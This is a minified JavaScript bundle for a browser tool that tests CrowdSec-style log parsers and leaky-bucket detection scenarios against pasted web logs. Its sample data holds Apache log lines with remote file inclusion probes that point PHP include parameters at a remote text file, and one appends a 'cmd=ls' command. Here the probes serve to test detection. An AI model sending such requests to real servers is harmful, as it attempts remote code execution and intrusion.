i={ip:n,range:e.Meta.SourceRange??"",scope:r,value:n||"",cn:e.Enriched.IsoCode??e.Meta.IsoCode??"",asNumber:e.Enriched.ASNNumber??e.Meta.ASNNumber??"",asOrg:e.Enriched.ASNOrg??e.Meta.ASNOrg??"",latitude:parseFloat(e.Enriched.Latitude??"0")||0,longitude:parseFloat(e.Enriched.Longitude??"0")||0};return r==="Range"&&i.range&&(i.value=i.range),i}function to(e){var i;const r=[];for(const[t,o]of Object.entries(e.Meta))r.push({key:t,value:o});return r.sort((t,o)=>t.key.localeCompare(o.key)),{timestamp:e.MarshaledTime||((i=e.Time)==null?void 0:i.toISOString())||"",meta:r}}function io(e){if(e<60)return`${e}s`;const r=Math.floor(e/3600),n=Math.floor(e%3600/60),i=e%60,t=[];return r&&t.push(`${r}h`),n&&t.push(`${n}m`),i&&t.push(`${i}s`),t.join("")}function oo(e,r){return r<=0?100:Math.round((1-e/r)*100)}function so(e,r={},n="user-paste"){return{Line:{Raw:e,Src:n,Time:new Date,Labels:r,Module:"file"},Parsed:{},Enriched:{},Unmarshaled:{},Meta:{},Stage:"",Process:!1,Whitelisted:!1,MarshaledTime:"",Time:new Date,StrTime:"",StrTimeFormat:"",Type:"LOG"}}const ao=5e3;class lo{constructor(){this.parsers=[],this.stages=[],this.parsersByStage=new Map,this.factories=[],this.store=new Xi,this.overflowChan=[]}loadParsers(r,n){for(const i of r){const t=Ui(i,n);this.parsers.push(...t)}[this.stages,this.parsersByStage]=Wi(this.parsers)}loadScenarios(r){for(const n of r){const i=qi(n,this.overflowChan);this.factories.push(...i)}}clearParsers(){this.parsers=[],this.stages=[],this.parsersByStage=new Map}clearScenarios(){this.factories=[]}resetBuckets(){this.store.clear(),this.overflowChan=[];for(const r of this.factories)r.overflowChan=this.overflowChan}reset(){this.clearParsers(),this.clearScenarios(),this.resetBuckets()}get scenarioNames(){return this.factories.map(r=>r.spec.name)}get parserNames(){return this.parsers.map(r=>r.name).filter(Boolean)}replay(r,n={}){if(!n.keepBucketState){this.overflowChan=[];for(const p of this.factories)p.overflowChan=this.overflowChan}const i={};n.logType&&(i.type=n.logType);let t=0,o=0,s=0,a=0;for(const p of r){const _=p.trim();if(!_)continue;a++;const d=so(_,i,n.logSrc??"replay");let E;if(this.stages.length>0?E=wi(d,this.parsersByStage,this.stages):(console.info(`[orchestrator] line ${a}: no parsers loaded, passing through as raw event`),d.Process=!0,d.Meta.source_ip="",E=d),!E.Process||E.Whitelisted){E.Whitelisted?console.info(`[orchestrator] line ${a}: WHITELISTED → discarded`):console.info(`[orchestrator] line ${a}: NOT PARSED (Process=false) → discarded`),o++;continue}E.MarshaledTime||(E.MarshaledTime=new Date().toISOString(),E.Time=new Date),t++,console.info(`[orchestrator] line ${a}: parsed OK  src=${E.Meta.source_ip??"?"}  t=${E.MarshaledTime}`),t%ao===0&&(console.info(`[orchestrator] GC buckets at parsedCount=${t}`),Zi(E.Time,this.store)),this.factories.length>0?ji(E,this.factories,this.store)&&s++:console.info(`[orchestrator] line ${a}: no scenarios loaded, skipping bucket pour`)}console.info(`[orchestrator] replay done: total=${a} parsed=${t} discarded=${o} poured=${s}`);const l=this.overflowChan.length;this.flushTimedBuckets();const c=this.overflowChan.length-l;c>0&&console.info(`[orchestrator] flushed ${c} timed bucket(s) at end of replay`);const u=[];for(const p of this.overflowChan){const _=ro(p);_&&(console.info(`[orchestrator] ALERT built: scenario="${_.scenario}"  src=${_.sources.map(d=>d.value||d.ip).join(", ")}  events=${_.eventsCount}  remediation=${_.remediation}`),u.push(_))}const A=this.buildBucketReport();return{alerts:u,bucketReport:A,parsedCount:t,discardedCount:o,pouredCount:s,totalLines:a}}flushTimedBuckets(){for(const r of this.store.snapshot())r.overflowed||r.canceled||r.timedOverflow&&r.queue.length!==0&&(r.ovflwTs=r.durationDeadline??r.lastTs??new Date,r.overflowed=!0,this.overflowChan.push({factory:r.factory,leaky:r,queue:[...r.queue]}))}buildBucketReport(){var n,i;const r=[];for(const t of this.store.snapshot()){if(t.queue.length===0&&!t.overflowed)continue;const o=t.capacity,s=oo(t.tokens,o),a=t.queue[t.queue.length-1],l=a?a.Meta.source_ip??a.Parsed.source_ip??t.mapkey.slice(0,8):t.mapkey.slice(0,8);r.push({scenario:t.factory.spec.name,mapkey:t.mapkey,partitionValue:l,totalEvents:t.totalCount,capacity:o,fillPercent:s,firstSeen:((n=t.firstTs)==null?void 0:n.toISOString())??"",lastSeen:((i=t.lastTs)==null?void 0:i.toISOString())??"",overflowed:t.overflowed})}return r.sort((t,o)=>o.fillPercent-t.fillPercent)}}const M=new lo,ne={parserFiles:[{name:"s00-syslog-logs.yaml",text:String.raw`filter: "evt.Line.Labels.type == 'syslog'"
onsuccess: next_stage
pattern_syntax:
  RAW_SYSLOG_PREFIX: '^<%{NUMBER:syslog_priority}>%{NUMBER:syslog_version} %{SYSLOGBASE2} %{DATA:program} (?:%{NUMBER:pid}|-)'
  RAW_SYSLOG_META: '\\[meta sequenceId="%{NOTDQUOTE:seq_id}"\\]'
name: crowdsecurity/syslog-logs
nodes:
  - grok:
      pattern: "^%{SYSLOGLINE}"
      apply_on: Line.Raw
  - grok:
      pattern: '%{RAW_SYSLOG_PREFIX} - (?:%{RAW_SYSLOG_META} |- )%{GREEDYDATA:message}'
      apply_on: Line.Raw
statics:
  - meta: machine
    expression: evt.Parsed.logsource
  - parsed: "logsource"
    value: "syslog"
  - target: evt.StrTime
    expression: evt.Parsed.timestamp
  - target: evt.StrTime
    expression: evt.Parsed.timestamp8601
  - meta: datasource_path
    expression: evt.Line.Src
  - meta: datasource_type
    expression: evt.Line.Module
---
filter: "evt.Line.Labels.type not in ['syslog', 'unifi']"
onsuccess: next_stage
name: crowdsecurity/non-syslog
statics:
  - parsed: message
    expression: evt.Line.Raw
  - parsed: program
    expression: evt.Line.Labels.type
  - meta: datasource_path
    expression: evt.Line.Src
  - meta: datasource_type
    expression: evt.Line.Module`},{name:"s01-apache2-logs.yaml",text:String.raw`filter: "evt.Parsed.program startsWith 'apache2'"
onsuccess: next_stage
name: crowdsecurity/apache2-logs
description: "Parse Apache2 access and error logs"
nodes:
  - grok:
      pattern: '(%{IPORHOST:target_fqdn}(:%{INT:port})? )?%{COMMONAPACHELOG}( "%{NOTDQUOTE:referrer}" "%{NOTDQUOTE:http_user_agent}")?'
      apply_on: message
      statics:
        - meta: log_type
          value: http_access-log
        - target: evt.StrTime
          expression: evt.Parsed.timestamp
        - meta: service
          value: http
        - meta: source_ip
          expression: evt.Parsed.clientip
        - meta: http_status
          expression: evt.Parsed.response
        - meta: http_path
          expression: "evt.Parsed.request != '' ? evt.Parsed.request : evt.Parsed.rawrequest"
        - meta: http_verb
          expression: "evt.Parsed.verb"
        - meta: http_user_agent
          expression: "evt.Parsed.http_user_agent"
        - meta: target_fqdn
          expression: "evt.Parsed.target_fqdn"
    onsuccess: next_stage`},{name:"s02-http-logs.yaml",text:String.raw`filter: "evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']"
description: "Parse more Specifically HTTP logs, such as HTTP Code, HTTP path, HTTP args and if its a static ressource"
name: crowdsecurity/http-logs
pattern_syntax:
  DIR: "^.*/"
  FILE: "[^/].*?"
  EXT: "\\\\.[^.]*$|$"
nodes:
  - statics:
     - parsed: "impact_completion"
       expression: "evt.Meta.http_status in ['404', '403', '502'] ? 'false' : 'true'"
     - target: evt.Parsed.static_ressource
       value: 'false'
  - grok:
      pattern: "^%{GREEDYDATA:request}\\?%{GREEDYDATA:http_args}$"
      apply_on: request
  - grok:
      pattern: "%{DIR:file_dir}(%{FILE:file_frag}%{EXT:file_ext})?"
      apply_on: request
      statics:
        - meta: http_path
          expression: "evt.Parsed.http_path"
        - meta: http_args_len
          expression: "len(evt.Parsed.http_args)"
        - parsed: file_name
          expression: evt.Parsed.file_frag + evt.Parsed.file_ext
        - parsed: static_ressource
          expression: "Upper(evt.Parsed.file_ext) in ['.JPG', '.CSS', '.JS', '.JPEG', '.PNG', '.SVG', '.MAP', '.ICO', '.OTF', '.GIF', '.MP3', '.MP4', '.WOFF', '.WOFF2', '.TTF', '.OTF', '.EOT', '.WEBP', '.WAV', '.GZ', '.BROTLI', '.BVR', '.TS', '.BMP', '.AVIF', '.MJS'] ? 'true' : 'false'"`}],scenarioFiles:[{name:"http-probing.yaml",text:String.raw`type: leaky
name: crowdsecurity/http-probing
description: "Detect site scanning/probing from a single ip"
filter: "evt.Meta.service == 'http' && evt.Meta.http_status in ['404', '403', '400'] && evt.Parsed.static_ressource == 'false'"
groupby: "evt.Meta.source_ip + '/' + evt.Parsed.target_fqdn"
distinct: "evt.Meta.http_path"
capacity: 10
reprocess: true
leakspeed: "10s"
blackhole: 5m
labels:
  remediation: true
  classification:
    - attack.T1595
  behavior: "http:scan"
  label: "HTTP Probing"
  spoofable: 0
  service: http
  confidence: 1`}],logsText:String.raw`172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /src/scripture.php?pageHeaderFile=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /starnet/themes/c-sky/main.inc.php?cmsdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /start.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /start.php?pg=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stat_modules/users_age/module.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stats.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stats.php?vwar_root=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stphpapplication.php?STPHPLIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stphpbtnimage.php?STPHPLIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stphpform.php?STPHPLIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /str.php?p=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /streamline-1.0-beta4/src/core/theme/includes/account_footer.php?sl_theme_unix_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196`,defaultLogType:"apache2"},m={parserFiles:[],scenarioFiles:[]},I=e=>document.getElementById(e),K=I("log-input"),we=I("run-btn"),co=I("load-test-data"),Ee=I("parser-list"),Te=I("scenario-list"),rr=I("status-badge"),Qr=I("line-count"),Ao=I("stats-bar"),te=I("alerts-container"),Pe=I("buckets-container");function zr(e,r,n,i,t){const o=I(e),s=I(r),a=async l=>{for(const c of Array.from(l)){if(n.some(A=>A.name===c.name))continue;let u;try{u=await c.text()}catch{console.warn(`Could not read file "${c.name}" — it may have been moved or removed.`);continue}n.push({name:c.name,text:u})}F(n,i,t),de(),b()};o.addEventListener("change",()=>{o.files&&a(o.files),o.value=""}),s.addEventListener("dragover",l=>{l.preventDefault(),s.classList.add("drag-over")}),s.addEventListener("dragleave",()=>s.classList.remove("drag-over")),s.addEventListener("drop",l=>{var c;l.preventDefault(),s.classList.remove("drag-over"),(c=l.dataTransfer)!=null&&c.files&&a(l.dataTransfer.files)})}function F(e,r,n){r.innerHTML="";for(let i=0;i<e.length;i++){const t=e[i],o=document.createElement("li");o.draggable=!0,o.dataset.index=String(i),o.dataset.kind=n,o.innerHTML=`<span class="drag-handle" title="Drag to reorder">⠿</span>
      <span class="file-name">${v(t.name)}</span>
      <button class="remove-file" data-name="${v(t.name)}" data-kind="${n}" title="Remove">✕</button>`,r.appendChild(o)}uo(r,e,n)}function Zr(){m.parserFiles=ne.parserFiles.map(r=>({...r})),m.scenarioFiles=ne.scenarioFiles.map(r=>({...r})),K.value=ne.logsText,I("log-type-select").value=ne.defaultLogType,F(m.parserFiles,Ee,"parser"),F(m.scenarioFiles,Te,"scenario"),de();const e=K.value.split(`
`).filter(r=>r.trim()).length;Qr.textContent=`${e} line${e!==1?"s":""}`,b(),ie("idle")}function uo(e,r,n){let i=-1;e.addEventListener("dragstart",t=>{const o=t.target.closest("li");o&&(i=Number(o.dataset.index),o.classList.add("dragging"),t.dataTransfer.effectAllowed="move")}),e.addEventListener("dragover",t=>{t.preventDefault(),t.dataTransfer.dropEffect="move";const o=t.target.closest("li");e.querySelectorAll("li").forEach(s=>s.classList.remove("drag-over")),o&&o.classList.add("drag-over")}),e.addEventListener("dragleave",()=>{e.querySelectorAll("li").forEach(t=>t.classList.remove("drag-over"))}),e.addEventListener("drop",t=>{t.preventDefault(),e.querySelectorAll("li").forEach(l=>l.classList.remove("drag-over","dragging"));const o=t.target.closest("li");if(!o)return;const s=Number(o.dataset.index);if(i===s)return;const[a]=r.splice(i,1);r.splice(s,0,a),F(r,e,n),de()}),e.addEventListener("dragend",()=>{e.querySelectorAll("li").forEach(t=>t.classList.remove("dragging","drag-over"))})}document.addEventListener("click",e=>{const r=e.target.closest(".remove-file");if(!r)return;const n=r.dataset.name;r.dataset.kind==="parser"?(m.parserFiles=m.parserFiles.filter(t=>t.name!==n),F(m.parserFiles,Ee,"parser")):(m.scenarioFiles=m.scenarioFiles.filter(t=>t.name!==n),F(m.scenarioFiles,Te,"scenario")),de(),b()});function de(){I("log-type-select").value,M.clearParsers(),M.clearScenarios();for(const e of m.parserFiles){const r=e.name.match(/^(s\d{2}-\w+)/),n=r?r[1]:"s01-parse";M.loadParsers([e.text],n)}M.loadScenarios(m.scenarioFiles.map(e=>e.text))}K.addEventListener("input",()=>{const e=K.value.split(`
`).filter(r=>r.trim()).length;Qr.textContent=`${e} line${e!==1?"s":""}`,b()});function b(){const e=K.value.trim().length>0,r=m.scenarioFiles.length>0||M.scenarioNames.length>0;we.disabled=!(e&&r)}we.addEventListener("click",po);async function po(){const r=K.value.split(`
`),n=I("log-type-select").value,i=I("keep-state").checked;ie("running"),we.disabled=!0,await So();try{const t=M.replay(r,{logType:n||void 0,keepBucketState:i});Ao.classList.remove("hidden"),I("stat-total").textContent=String(t.totalLines),I("stat-parsed").textContent=String(t.parsedCount),I("stat-poured").textContent=String(t.pouredCount),I("stat-alerts").textContent=String(t.alerts.length),_o(t.alerts),To(t.bucketReport),ie("done")}catch(t){console.error(t),ie("error"),te.innerHTML=`<div class="empty-state" style="color:var(--cs-danger)">
      Error: ${v(String(t))}
    </div>`}finally{b()}}function _o(e){if(e.length===0){te.innerHTML='<div class="empty-state">No alerts generated</div>';return}te.innerHTML=e.map((r,n)=>Eo(r,n)).join(""),te.querySelectorAll(".alert-details-toggle").forEach(r=>{r.addEventListener("click",()=>{const i=r.nextElementSibling.classList.toggle("open");r.textContent=i?"▾ Hide events":"▸ Show events"})})}function Eo(e,r){const n=e.remediation?'<span class="tag tag-ban">BAN</span>':'<span class="tag" style="background:rgba(245,158,11,0.2);color:var(--cs-warn)">ALERT</span>',i=`<span class="tag tag-events">${e.eventsCount} events</span>`,t=e.sources.map(l=>`<span class="tag tag-source">${v(l.value||l.ip)}</span>`).join(""),o=e.remediation?"remediation":"no-remediation",a=[["Scenario",e.scenario],["Start",e.startAt],["End",e.stopAt],["Events",String(e.eventsCount)],["Capacity",String(e.capacity)],["Leak speed",e.leakspeed],...e.sources.map(l=>["Source",`${l.value}${l.cn?" ("+l.cn+")":""}${l.asOrg?" / "+l.asOrg:""}`]),...Object.entries(e.labels).map(([l,c])=>[`Label.${l}`,String(c)])].map(([l,c])=>`<tr><td>${v(l)}</td><td>${v(c)}</td></tr>`).join("");return`
<div class="alert-card ${o}" id="alert-${r}">
  <div class="alert-header">
    <div>
      <div class="alert-scenario">${v(e.scenario)}</div>
      <div class="alert-meta">${v(e.scenarioDescription||"")}</div>
    </div>
    <div class="alert-tags">${n}${i}${t}</div>
  </div>
  <div class="alert-message">${v(e.message)}</div>
  <button class="alert-details-toggle">▸ Show events</button>
  <div class="alert-details">
    <table>${a}</table>
  </div>
</div>`}function To(e){if(e.length===0){Pe.innerHTML='<div class="empty-state">No active buckets</div>';return}Pe.innerHTML=e.map(r=>fo(r)).join("")}function fo(e){const r=e.fillPercent,n=r>=100?"fill-full":r>=75?"fill-high":r>=50?"fill-medium":"fill-low",i=e.overflowed?'<span class="bucket-overflowed">OVERFLOWED</span>':"";return`
<div class="bucket-card">
  <div class="bucket-header">
    <div>
      <div class="bucket-scenario">${v(e.scenario)}</div>
      <div class="bucket-partition">${v(e.partitionValue)}</div>
    </div>
    <div style="display:flex;align-items:center;gap:6px">
      ${i}
      <span style="font-size:13px;font-weight:700;color:var(--cs-text)">${r}%</span>
    </div>
  </div>
  <div class="fill-bar">
    <div class="fill-bar-inner ${n}" style="width:${Math.min(r,100)}%"></div>
  </div>
  <div class="bucket-stats">
    <span>${e.totalEvents} events</span>
    <span>cap: ${e.capacity}</span>
    ${e.firstSeen?`<span>first: ${nr(e.firstSeen)}</span>`:""}
    ${e.lastSeen?`<span>last: ${nr(e.lastSeen)}</span>`:""}
  </div>
</div>`}I("clear-parsers").addEventListener("click",()=>{m.parserFiles=[],F(m.parserFiles,Ee,"parser"),M.clearParsers(),b()});I("clear-scenarios").addEventListener("click",()=>{m.scenarioFiles=[],F(m.scenarioFiles,Te,"scenario"),M.clearScenarios(),b()});I("reset-buckets").addEventListener("click",()=>{M.resetBuckets(),Pe.innerHTML='<div class="empty-state">Bucket state cleared</div>'});co.addEventListener("click",()=>{Zr()});document.querySelectorAll(".tab").forEach(e=>{e.addEventListener("click",()=>{const r=e.dataset.tab;document.querySelectorAll(".tab").forEach(n=>n.classList.remove("active")),document.querySelectorAll(".tab-content").forEach(n=>n.classList.remove("active")),e.classList.add("active"),document.getElementById(`tab-${r}`).classList.add("active")})});zr("parser-files","parser-drop",m.parserFiles,Ee,"parser");zr("scenario-files","scenario-drop",m.scenarioFiles,Te,"scenario");Zr();function ie(e){rr.className=`badge badge-${e}`,rr.textContent=e.charAt(0).toUpperCase()+e.slice(1)}function So(){return new Promise(e=>setTimeout(e,0))}function v(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;")}function nr(e){try{return new Date(e).toLocaleTimeString()}catch{return e}}
//# sourceMappingURL=index-Ch9M30NH.js.map
